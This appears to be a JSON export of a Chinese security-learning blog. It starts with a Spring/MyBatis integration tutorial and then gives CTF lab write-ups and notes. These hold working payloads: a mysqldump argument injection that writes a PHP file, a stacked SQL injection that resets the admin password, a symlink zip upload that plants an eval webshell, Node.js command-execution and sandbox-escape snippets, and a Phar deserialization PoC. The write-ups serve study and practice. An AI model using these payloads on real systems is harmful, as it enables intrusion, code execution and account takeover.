&lt;artifactId&gt;junit&lt;/artifactId&gt;   &lt;version&gt;4.12&lt;/version&gt;&lt;/dependency&gt;\n\nmybatis\n&lt;dependency&gt;   &lt;groupId&gt;org.mybatis&lt;/groupId&gt;   &lt;artifactId&gt;mybatis&lt;/artifactId&gt;   &lt;version&gt;3.5.2&lt;/version&gt;&lt;/dependency&gt;\n\nmysql数据库：mysql-connector-java\n&lt;dependency&gt;   &lt;groupId&gt;mysql&lt;/groupId&gt;   &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;   &lt;version&gt;5.1.47&lt;/version&gt;&lt;/dependency&gt;\n\nspring相关的：spring-webmvc\n&lt;dependency&gt;   &lt;groupId&gt;org.springframework&lt;/groupId&gt;   &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;   &lt;version&gt;5.1.10.RELEASE&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;   &lt;groupId&gt;org.springframework&lt;/groupId&gt;   &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt;   &lt;version&gt;5.1.10.RELEASE&lt;/version&gt;&lt;/dependency&gt;\n\naspectJ AOP 织入器\n&lt;dependency&gt;   &lt;groupId&gt;org.aspectj&lt;/groupId&gt;   &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt;   &lt;version&gt;1.9.4&lt;/version&gt;&lt;/dependency&gt;\n\nmybatis-spring整合包【重点】\n&lt;dependency&gt;   &lt;groupId&gt;org.mybatis&lt;/groupId&gt;   &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt;   &lt;version&gt;2.0.2&lt;/version&gt;&lt;/dependecy&gt;\n\n配置Maven静态资源过滤问题！\n&lt;build&gt;   &lt;resources&gt;       &lt;resource&gt;           &lt;directory&gt;src/main/java&lt;/directory&gt;           &lt;includes&gt;               &lt;include&gt;**/*.properties&lt;/include&gt;               &lt;include&gt;**/*.xml&lt;/include&gt;           &lt;/includes&gt;           &lt;filtering&gt;true&lt;/filtering&gt;       &lt;/resource&gt;   &lt;/resources&gt;&lt;/build&gt;\n\n\n编写配置文件\n\n测试\n\n\n12.1、回忆mybatis\n编写实体类\npackage nuc.ss.pojo;public class User &#123;   private int id;   private String name;   private String pwd;&#125;\n\n编写核心配置文件\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE configuration       PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;       &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;&lt;configuration&gt;   &lt;typeAliases&gt;       &lt;package name=&quot;nuc.ss.pojo&quot;/&gt;   &lt;/typeAliases&gt;   &lt;environments default=&quot;development&quot;&gt;       &lt;environment id=&quot;development&quot;&gt;           &lt;transactionManager type=&quot;JDBC&quot;/&gt;           &lt;dataSource type=&quot;POOLED&quot;&gt;               &lt;property name=&quot;driver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt;               &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/mybatis?useSSL=true&amp;amp;useUnicode=true&amp;amp;characterEncoding=utf8&quot;/&gt;               &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt;               &lt;property name=&quot;password&quot; value=&quot;admin&quot;/&gt;           &lt;/dataSource&gt;       &lt;/environment&gt;   &lt;/environments&gt;   &lt;mappers&gt;       &lt;package name=&quot;nuc.ss.dao&quot;/&gt;   &lt;/mappers&gt;&lt;/configuration&gt;\n\n编写接口\npublic interface UserMapper &#123;   public List&lt;User&gt; selectUser();&#125;\n\n编写Mapper.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper       PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;       &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;nuc.ss.dao.UserMapper&quot;&gt;   &lt;select id=&quot;selectUser&quot; resultType=&quot;User&quot;&gt;    select * from user   &lt;/select&gt;&lt;/mapper&gt;\n\n测试\n@Testpublic void selectUser() throws IOException &#123;   String resource = &quot;mybatis-config.xml&quot;;   InputStream inputStream = Resources.getResourceAsStream(resource);   SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);   SqlSession sqlSession = sqlSessionFactory.openSession();   UserMapper mapper = sqlSession.getMapper(UserMapper.class);   List&lt;User&gt; userList = mapper.selectUser();   for (User user: userList)&#123;       System.out.println(user);  &#125;   sqlSession.close();&#125;\n\n12.2、Mybatis-Spring引入Spring之前需要了解mybatis-spring包中的一些重要类；\nmybatis-spring官网 \n\n什么是 MyBatis-Spring？\nMyBatis-Spring 会帮助你将 MyBatis 代码无缝地整合到 Spring 中。\n知识基础\n在开始使用 MyBatis-Spring 之前，你需要先熟悉 Spring 和 MyBatis 这两个框架和有关它们的术语。这很重要\nMyBatis-Spring 需要以下版本：\n\n\n\nMyBatis-Spring\nMyBatis\nSpring 框架\nSpring Batch\nJava\n\n\n\n2.0\n3.5+\n5.0+\n4.0+\nJava 8+\n\n\n1.3\n3.4+\n3.2.2+\n2.1+\nJava 6+\n\n\n如果使用 Maven 作为构建工具，仅需要在 pom.xml 中加入以下代码即可：\n&lt;dependency&gt;   &lt;groupId&gt;org.mybatis&lt;/groupId&gt;   &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt;   &lt;version&gt;2.0.2&lt;/version&gt;&lt;/dependency&gt;\n\n整合方式一\n\n引入配置文件\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;      xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;      xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;&lt;/beans&gt;\n\n编写数据源配置\n&lt;!--配置数据源：数据源有非常多，可以使用第三方的，也可使使用Spring的--&gt;&lt;bean id=&quot;dataSource&quot; class=&quot;org.springframework.jdbc.datasource.DriverManagerDataSource&quot;&gt;   &lt;property name=&quot;driverClassName&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt;   &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/mybatis?useSSL=true&amp;amp;useUnicode=true&amp;amp;characterEncoding=utf8&quot;/&gt;   &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt;   &lt;property name=&quot;password&quot; value=&quot;admin&quot;/&gt;&lt;/bean&gt;\n\nsqlSessionFactory\n&lt;!--配置SqlSessionFactory--&gt;&lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt;   &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt;   &lt;!--关联Mybatis--&gt;   &lt;property name=&quot;configLocation&quot; value=&quot;classpath:mybatis-config.xml&quot;/&gt;   &lt;property name=&quot;mapperLocations&quot; value=&quot;classpath:nuc/ss/dao/*.xml&quot;/&gt;&lt;/bean&gt;\n\nsqlSessionTemplate\n&lt;!--注册sqlSessionTemplate , 关联sqlSessionFactory--&gt;&lt;bean id=&quot;sqlSession&quot; class=&quot;org.mybatis.spring.SqlSessionTemplate&quot;&gt;   &lt;!--利用构造器注入,没有set注入，只能使用构造器注入--&gt;   &lt;constructor-arg index=&quot;0&quot; ref=&quot;sqlSessionFactory&quot;/&gt;&lt;/bean&gt;\n\n需要给接口加实现类【新加的】\npublic class UserDaoImpl implements UserMapper &#123;   //sqlSession不用我们自己创建了，Spring来管理   private SqlSessionTemplate sqlSession;   public void setSqlSession(SqlSessionTemplate sqlSession) &#123;       this.sqlSession = sqlSession;  &#125;   public List&lt;User&gt; selectUser() &#123;       UserMapper mapper = sqlSession.getMapper(UserMapper.class);       return mapper.selectUser();  &#125;&#125;\n\n将自己写的实现类，注入到Spring中\n&lt;bean id=&quot;userDao&quot; class=&quot;nuc.ss.dao.UserDaoImpl&quot;&gt;   &lt;property name=&quot;sqlSession&quot; ref=&quot;sqlSession&quot;/&gt;&lt;/bean&gt;\n\n测试使用即可\n@Testpublic void test2()&#123;    ApplicationContext context = new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;);    UserMapper mapper = (UserMapper) context.getBean(&quot;userDao&quot;);    List&lt;User&gt; user = mapper.selectUser();    System.out.println(user);&#125;\n\n结果成功输出！现在我们的Mybatis配置文件的状态！发现都可以被Spring整合！\n为了给mybatis-config.xml留点面子(使用方便)，在其中将别名和设置留下来\n   &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE configuration          PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;          &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;&lt;configuration&gt;    &lt;typeAliases&gt;        &lt;package name=&quot;nuc.ss.pojo&quot;/&gt;    &lt;/typeAliases&gt;   &lt;!-- &lt;settings&gt;    \t&lt;setting&gt;&lt;/setting&gt;    &lt;/settings&gt; --&gt;&lt;/configuration&gt;\n\n\n\n**整合实现二  **\nmybatis-spring1.2.3版以上的才有这个 .\n官方文档截图 :\ndao继承Support类 , 直接利用 getSqlSession() 获得 , 然后直接注入SqlSessionFactory . 比起方式1 , 不需要管理SqlSessionTemplate , 而且对事务的支持更加友好 . 可跟踪源码查看\n\n测试：\n\n将我们上面写的UserDaoImpl修改一下\npublic class UserDaoImpl extends SqlSessionDaoSupport implements UserMapper &#123;   public List&lt;User&gt; selectUser() &#123;       UserMapper mapper = getSqlSession().getMapper(UserMapper.class);       return mapper.selectUser();  &#125;&#125;\n\n修改bean的配置\n&lt;bean id=&quot;userDao&quot; class=&quot;nuc.ss.dao.UserDaoImpl&quot;&gt;   &lt;property name=&quot;sqlSessionFactory&quot; ref=&quot;sqlSessionFactory&quot; /&gt;&lt;/bean&gt;\n\n测试\n@Testpublic void test2()&#123;   ApplicationContext context = new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;);   UserMapper mapper = (UserMapper) context.getBean(&quot;userDao&quot;);   List&lt;User&gt; user = mapper.selectUser();   System.out.println(user);&#125;\n\n总结 : 整合到spring以后可以完全不要mybatis的配置文件，除了这些方式可以实现整合之外，我们还可以使用注解来实现，这个等我们后面学习SpringBoot的时候还会测试整合！\n13、声明式事务13.1、回顾事务\n把一组业务当成一个业务来做；要么都成功，要么都失败！\n事务在项目开发中，十分重要，涉及到数据的一致性问题，不能马虎\n确保完整性和一致性\n\n事务的ACID原则\n\n原子性（atomicity）\n事务是原子性操作，由一系列动作组成，事务的原子性确保动作要么全部完成，要么完全不起作用\n\n\n一致性（consistency）\n一旦所有事务动作完成，事务就要被提交。数据和资源处于一种满足业务规则的一致性状态中\n\n\n隔离性（isolation）\n多个业务可能操作同一个资源，防止数据损坏\n\n\n持久性（durability）\n事务一旦提交，无论系统发生什么问题，结果都不会再被影响，被持久化的写到存储器中！\n\n\n\n13.2、Spring中的事务管理\n声明式事务：AOP\n\n一般情况下比编程式事务好用。\n将事务管理代码从业务方法中分离出来，以声明的方式来实现事务管理。\n将事务管理作为横切关注点，通过aop方法模块化。Spring中通过Spring AOP框架支持声明式事务管理\n\n\n编程式事务：需要在代码中，进行事务的管理\n\n将事务管理代码嵌到业务方法中来控制事务的提交和回滚\n缺点：必须在每个事务操作业务逻辑中包含额外的事务管理代码\n\n\n使用Spring管理事务，注意头文件的约束导入 : tx\nxmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;http://www.springframework.org/schema/txhttp://www.springframework.org/schema/tx/spring-tx.xsd&quot;&gt;\n\n事务管理器\n\n无论使用Spring的哪种事务管理策略（编程式或者声明式）事务管理器都是必须的。\n就是 Spring的核心事务管理抽象，管理封装了一组独立于技术的方法。\n\n\nJDBC事务\n&lt;bean id=&quot;transactionManager&quot; class=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt;       &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot; /&gt;&lt;/bean&gt;\n\n配置事务的通知\n&lt;!--配置事务通知--&gt;&lt;tx:advice id=&quot;txAdvice&quot; transaction-manager=&quot;transactionManager&quot;&gt;   &lt;tx:attributes&gt;       &lt;!--配置哪些方法使用什么样的事务,配置事务的传播特性--&gt;       &lt;tx:method name=&quot;add&quot; propagation=&quot;REQUIRED&quot;/&gt;       &lt;tx:method name=&quot;delete&quot; propagation=&quot;REQUIRED&quot;/&gt;       &lt;tx:method name=&quot;update&quot; propagation=&quot;REQUIRED&quot;/&gt;       &lt;tx:method name=&quot;search*&quot; propagation=&quot;REQUIRED&quot;/&gt;       &lt;tx:method name=&quot;get&quot; read-only=&quot;true&quot;/&gt;       &lt;tx:method name=&quot;*&quot; propagation=&quot;REQUIRED&quot;/&gt;   &lt;/tx:attributes&gt;&lt;/tx:advice&gt;\n\nspring事务传播特性：\n事务传播行为就是多个事务方法相互调用时，事务如何在这些方法间传播。spring支持7种事务传播行为：\n\npropagation_requierd：如果当前没有事务，就新建一个事务，如果已存在一个事务中，加入到这个事务中，这是最常见的选择。\npropagation_supports：支持当前事务，如果没有当前事务，就以非事务方法执行。\npropagation_mandatory：使用当前事务，如果没有当前事务，就抛出异常。\npropagation_required_new：新建事务，如果当前存在事务，把当前事务挂起。\npropagation_not_supported：以非事务方式执行操作，如果当前存在事务，就把当前事务挂起。\npropagation_never：以非事务方式执行操作，如果当前事务存在则抛出异常。\npropagation_nested：如果当前存在事务，则在嵌套事务内执行。如果当前没有事务，则执行与propagation_required类似的操作\n\n\n配置AOP（导入aop的头文件！）\n&lt;!--配置aop织入事务--&gt;&lt;aop:config&gt;   &lt;aop:pointcut id=&quot;txPointcut&quot; expression=&quot;execution(* nuc.ss.dao.*.*(..))&quot;/&gt;   &lt;aop:advisor advice-ref=&quot;txAdvice&quot; pointcut-ref=&quot;txPointcut&quot;/&gt;&lt;/aop:config&gt;\n\n思考：\n为什么需要事务？\n\n如果不配置，可能存在数据提交不一致的情况；\n如果我们不在Spring中去配置声明式事务，我们需要在代码中手动配置事务！\n事务在项目开发过程非常重要，涉及到数据的一致性的问题，不容马虎！\n\n","categories":["java"],"tags":["java","spring"]},{"title":"dumpit","url":"/2025/03/27/web/ichunqiu/dumpit/","content":"扫了一遍，没东西.题目是这个玩意\nuse ?db=&amp;table_2_query= or ?db=&amp;table_2_dump= to view the tables! etc:?db=ctf&amp;table_2_query=flag1\n\n随便按照上面的提示进行输入\n?db=ctf&amp;table_2_query=flag1\n\n尝试sql发现没有注入然后我不会了\n查到?db&#x3D;&amp;table_2_dump&#x3D; 估计调⽤的是 mysqldump 之类的命令, 存在命令注⼊–result-file  filename可以用来指定生成文件\n?db=&quot;&lt;?=phpinfo()?&gt;&quot; --result-file shell.php&amp;table_2_dump=flag1\n在phpinfo里面找到flag即可\n","categories":["i春秋靶场"],"tags":["web","命令执行"]},{"title":"phpstudy","url":"/2025/04/05/web/ichunqiu/phpstudy/","content":"绕过随机码–&gt;堆叠注入\n\n打开网站后只有404抓包，\nX-Requested-With: XMLHttpRequest\n\n此时我们就可以看见登录的界面了。\n修改密码为123456：\nadmin&#x27;;UPDATE ADMINS set PASSWORD = &#x27;c26be8aaf53b15054896983b43eb6a65&#x27; where username = &#x27;admin&#x27;;--\n\n登进去了\nflag在&#x2F;flag下面\n","categories":["i春秋靶场"],"tags":["web","sql注入","phpstudy_rce"]},{"title":"unzip","url":"/2025/03/27/web/ichunqiu/unzip/","content":"有个upload.php\n &lt;?php   error_reporting(0); highlight_file(__FILE__); $finfo = finfo_open(FILEINFO_MIME_TYPE); if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#x27;application/zip&#x27;)&#123;      //这里是验证MIME值，确定上传的文件类型为zip，同时也为我们指明了方向，要上传一个zip压缩包。        exec(&#x27;cd /tmp &amp;&amp; unzip -o &#x27; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);   //这里的意思是进入/tmp目录下，然后调用unzip命令对压缩包进行解压，也就是把压缩包解压到/tmp目录下。  &#125;;//only this! \n\n要传🐎，但是路径是&#x2F;tmp考虑软连接\n要创建软链接，可以使用ln -s命令，其基本语法如下：\nln -s [源文件或目录] [目标文件或目录]\n注意：在指定源文件或目录和目标文件或目录时，不要在路径后面加上斜杠(&#x2F;)。例如，要在当前目录下创建一个指向&#x2F;var&#x2F;www&#x2F;test目录的软链接test，可以执行：\nln -s /var/www/test test\n如果要在&#x2F;var目录下创建一个指向&#x2F;var&#x2F;www&#x2F;test的软链接test，则执行：\nln -s /var/www/test /var/test\n\n于是,我们创建一个指向&#x2F;www&#x2F;html&#x2F;的软连接&#x2F;tmp&#x2F;test\nln -s /var/www/html /tmp/test\n压缩为zip传上去\n🐎mama.php\n&lt;?php eval($_POST[a]);?&gt;\n\n路径为&#x2F;test&#x2F;mama.php压缩为zip\n访问mama.php开始找flagflag在&#x2F;flag下\n","categories":["i春秋靶场"],"tags":["web","upload"]},{"title":"禁止访问","url":"/2025/03/29/web/ichunqiu/%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE/","content":"抓个包\nHTTP/1.1 200 OKDate: Sat, 29 Mar 2025 14:55:23 GMTContent-Type: text/html; charset=UTF-8Content-Length: 463Connection: keep-aliveX-Powered-By: PHP/7.2.34Vary: Accept-Encoding&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;禁止访问&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;index.css&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;h1&gt;403 Forbidden&lt;/h1&gt;        &lt;p&gt;You are not authorized to access this resource.&lt;/p&gt;        &lt;p&gt;If you think this is a mistake, please contact the website administrator.&lt;/p&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;!-- error client-ip, plz use 192.168.*.* --&gt;\n我们看到\n&lt;!-- error client-ip, plz use 192.168.*.* --&gt;\n\n用burp爆，后两位从1-255遍历\nGET / HTTP/1.1Host: eci-2ze7s4z2n49ytjonezu9.cloudeci1.ichunqiu.comCache-Control: max-age=0Accept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36X-Forwarded-For: 192.168.§1§.§1§Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brConnection: keep-alive\n什么东西都没有（\n又审了一遍考虑用Client-IP\nGET / HTTP/1.1Host: eci-2ze7s4z2n49ytjonezu9.cloudeci1.ichunqiu.comCache-Control: max-age=0Accept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36Client-IP: 192.168.§1§.§1§Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brConnection: keep-alive\n\n这回爆出来了,tm的居然192.168.1.1\nHTTP/1.1 200 OKDate: Sat, 29 Mar 2025 15:06:06 GMTContent-Type: text/html; charset=UTF-8Content-Length: 460Connection: keep-aliveX-Powered-By: PHP/7.2.34Vary: Accept-Encoding&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;禁止访问&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;index.css&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;h1&gt;403 Forbidden&lt;/h1&gt;        &lt;p&gt;You are not authorized to access this resource.&lt;/p&gt;        &lt;p&gt;If you think this is a mistake, please contact the website administrator.&lt;/p&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;flag&#123;b0f38231-f0d4-4144-ad49-f82d4b684a76&#125;","categories":["i春秋靶场"],"tags":["web","ssrf"]},{"title":"遗留的压缩包","url":"/2025/03/29/web/ichunqiu/%E9%81%97%E7%95%99%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/","content":"题目中有压缩包，考虑到www.zip 访问www.zip发现居然真的有 \n1337.php\n&lt;?php# leetif(md5($_GET[&#x27;pwd&#x27;])==&#x27;217f81b8ff0a1ab138a8e1bdc031262e&#x27;)&#123;   eval($_POST[&#x27;1337&#x27;]);&#125;\n\n明显是md5碰撞猜测pwd复杂度不高戳个py脚本\nimport hashlibfrom itertools import productdef find_md5(target_hash, max_length=4):    chars = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;        def calculate_md5(text):        return hashlib.md5(text.encode()).hexdigest()        for length in range(1, max_length + 1):        for guess in product(chars, repeat=length):            candidate = &#x27;&#x27;.join(guess)            if calculate_md5(candidate) == target_hash:                return candidate                return Nonetarget = &#x27;217f81b8ff0a1ab138a8e1bdc031262e&#x27;result = find_md5(target)print(result)\n\n爆出来leet然后就是命令执行了\n","categories":["i春秋靶场"],"tags":["web","命令执行","hash"]},{"title":"jwt","url":"/2025/03/10/web/jwt/jwt/","content":"JWT简介JWT即Json Web Token的缩写，顾名思义，是Token的一种。它常被用来在向服务器发起请求时用作身份认证。使用JWT作为身份认证的优势在于：它不需要在服务端去保留用户的认证信息。仅需要对该Token正确性进行校验即可,这就意味着基于token认证机制的应用,不需要去考虑用户在哪一台服务器登录了，为应用的扩展提供了便利。\n新技术带来便利的同时也会带来新的安全问题，如果JWT本身安全存在问题，那么整个身份认证机制就会得不到保障。\nJWT由三部分组成，类似于xxx.yyy.zzz，前两部分是base64编码的内容，第三部分是加密的签名部分\n弱签名算法（无算法）更改头部中声明的加密算法\n弱密码如果JWT使用HS系列(对称加密)的加密方法，而且使用较为简单的Key进行加密，那么使用工具就极有可能能够得到key,之后就可以随意的篡改JWT了。jwt_tool&lt;-是个好东西。\n","categories":["jwt"],"tags":["web"]},{"title":"nodejs执行命令","url":"/2025/03/24/web/nodejs/nodejs/","content":"以下是 Node.js 中执行系统命令的各种方法 的详细介绍，包括适用场景、实现方式和安全注意事项：\n\n1. child_process.exec（标准方式）适用场景\n常规 Node.js 环境下执行 Shell 命令。\n适用于需要获取命令输出或错误信息的场景。\n\n代码示例const &#123; exec &#125; = require(&#x27;child_process&#x27;);exec(&#x27;ls -la&#x27;, (error, stdout, stderr) =&gt; &#123;  if (error) console.error(`Error: $&#123;error&#125;`);  else console.log(`Output: $&#123;stdout&#125;`);&#125;);\n特点✅ 标准方法，官方推荐。✅ 可以获取命令的 完整输出（stdout&#x2F;stderr）。❌ 如果用户输入未过滤，可能导致 命令注入（RCE）。  \n防御措施\n使用 execFile（避免 Shell 解析）：execFile(&#x27;ls&#x27;, [&#x27;-la&#x27;], (error, stdout) =&gt; &#123; ... &#125;);\n对用户输入进行 严格过滤（如白名单校验）。\n\n\n2. process.mainModule.constructor._load（绕过 require 限制）适用场景\n某些环境禁用 require，但仍需动态加载模块（如沙箱逃逸）。\n\n代码示例const childProcess = global.process.mainModule.constructor._load(&#x27;child_process&#x27;, null, true);childProcess.exec(&#x27;恶意命令&#x27;);\n特点✅ 可以绕过部分 require 限制。❌ 依赖 global.process 的访问权限。❌ 容易被安全工具检测（如 WAF）。  \n防御措施\n禁止修改 global.process：Object.freeze(global.process);\n\n\n3. vm 沙箱逃逸（利用漏洞执行命令）适用场景\n当代码运行在 vm 沙箱中，但沙箱配置不严格时。\n\n代码示例const vm = require(&#x27;vm&#x27;);const script = new vm.Script(`  this.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).exec(&#x27;恶意命令&#x27;);`);script.runInNewContext(&#123;&#125;);\n特点✅ 可绕过简单沙箱限制。❌ 依赖 沙箱配置错误（如未隔离原型链）。❌ 高版本 Node.js 已修复部分漏洞。  \n防御措施\n使用更安全的沙箱（如 vm2）。\n禁止访问 constructor：vm.runInNewContext(&#x27;代码&#x27;, &#123;&#125;, &#123; timeout: 1000 &#125;);\n\n\n4. process.binding（底层 API）适用场景\n需要直接调用 Node.js 底层 C++ 绑定（如 spawn_sync）。\n\n代码示例process.binding(&#x27;spawn_sync&#x27;).spawn(&#123;  file: &#x27;bash&#x27;,  args: [&#x27;-c&#x27;, &#x27;恶意命令&#x27;],  stdio: [&#x27;pipe&#x27;, &#x27;pipe&#x27;, &#x27;pipe&#x27;]&#125;);\n特点✅ 绕过 child_process 模块限制。❌ 依赖 Node.js 版本（新版可能移除该 API）。❌ 需要进程权限。  \n防御措施\n限制 process.binding 访问：delete process.binding;\n\n\n5. Worker Threads（多线程执行）适用场景\n在 Worker 线程中隐藏恶意代码。\n\n代码示例const &#123; Worker &#125; = require(&#x27;worker_threads&#x27;);new Worker(`  const &#123; exec &#125; = require(&#x27;child_process&#x27;);  exec(&#x27;恶意命令&#x27;);`, &#123; eval: true &#125;);\n特点✅ 可绕过主线程监控。❌ 需要启用 eval: true。❌ 可能被 进程监控工具 发现。  \n防御措施\n禁止动态 Worker 代码：new Worker(&#x27;file.js&#x27;); // 只允许文件加载\n\n\n6. fs + exec（写入脚本后执行）适用场景\n当直接执行命令被拦截，但允许写入文件时。\n\n代码示例const fs = require(&#x27;fs&#x27;);fs.writeFileSync(&#x27;/tmp/exploit.sh&#x27;, &#x27;恶意命令&#x27;);require(&#x27;child_process&#x27;).exec(&#x27;bash /tmp/exploit.sh&#x27;);\n特点✅ 可绕过简单命令黑名单。❌ 依赖 文件写入权限。❌ 可能被 文件监控 检测。  \n防御措施\n限制临时目录写入权限。\n监控敏感文件创建（如 /tmp/exploit.sh）。\n\n\n总结对比表\n\n\n方法\n适用场景\n绕过能力\n防御措施\n\n\n\nchild_process.exec\n常规命令执行\n❌\n输入过滤 + execFile\n\n\nprocess.mainModule._load\n绕过 require 限制\n✅\n冻结 global.process\n\n\nvm 沙箱逃逸\n沙箱环境\n✅（需漏洞）\n使用 vm2 沙箱\n\n\nprocess.binding\n底层 API 调用\n✅\n删除 process.binding\n\n\nWorker Threads\n多线程隐藏执行\n✅\n禁用 eval: true\n\n\nfs + exec\n文件写入后执行\n✅\n文件监控 + 权限限制\n\n\n\n终极防御建议\n最小权限原则：Node.js 进程以低权限用户运行。\n输入过滤：禁止用户输入进入 exec、eval 等。\n依赖检查：避免使用恶意第三方包（如 npm audit）。\nWAF：使用 Web 应用防火墙拦截可疑请求。\n沙箱隔离：敏感操作放在受限环境（如 Docker、vm2）。\n\n\n⚠️ 重要提醒：以上方法仅限 授权渗透测试，未经授权使用属 违法行为！\n","categories":["nodejs"],"tags":["web","ai写的"]},{"title":"Phar反序列化","url":"/2025/03/20/web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"Phar反序列化是一种利用Phar文件的特性进行攻击的方法。Phar文件是一种压缩文件，类似于Java中的JAR包，Phar文件会以序列化的形式存储用户自定义的meta-data，从而扩展反序列化漏洞的攻击面\n反序列化的条件要实现Phar反序列化，需要满足以下几个条件：\nPhar文件能够上传到服务器端：攻击者需要能够将Phar文件上传到目标服务器，以便利用Phar文件中的序列化数据进行反序列化攻击\n存在可利用的魔术方法：Phar文件中的meta-data会在反序列化时被解析，因此需要有可利用的魔术方法（如__destruct、__wakeup等）作为“跳板”，以便在反序列化过程中执行恶意代码\n文件操作函数的参数可控：需要能够控制文件操作函数的参数，并且这些参数中包含特殊字符（如:、&#x2F;、phar等）没有被过滤。这样可以通过Phar伪协议读取并解析Phar文件，从而触发反序列化\n示例代码以下是一个简单的Phar文件生成示例：\n&lt;?phpclass TestObject &#123;public function __destruct() &#123;echo &#x27;Destruct called&#x27;;&#125;&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); // 后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 设置stub$o = new TestObject();$phar-&gt;setMetadata($o); // 将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); // 添加要压缩的文件$phar-&gt;stopBuffering();?&gt;\n\n在生成Phar文件后，可以通过以下代码触发反序列化：\n&lt;?php$filename = &#x27;phar://phar.phar/test.txt&#x27;;file_get_contents($filename);?&gt;\n\n重要注意事项在进行Phar反序列化攻击时，需要注意以下几点：\nPhar文件的生成：生成Phar文件时，需要将php.ini中的phar.readonly选项设置为Off，否则无法生成Phar文件\n绕过检测 条件竞争等方案来传🐎\n通过满足上述条件，可以在不调用unserialize()函数的情况下实现Phar反序列化攻击，从而执行恶意代码。\n这个更详细 